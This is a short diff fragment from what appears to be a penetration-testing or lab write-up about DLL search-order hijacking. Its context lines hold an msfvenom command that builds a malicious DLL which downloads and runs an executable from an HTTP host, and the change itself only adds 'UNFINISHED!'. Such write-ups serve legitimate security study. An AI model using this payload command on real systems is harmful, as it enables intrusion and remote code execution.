@@ -564,4 +564,4 @@ Because of DLL search order i can craft a malicious dll then place it in the sam
 msfvenom -a x64 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
 ```
 
-
+UNFINISHED!
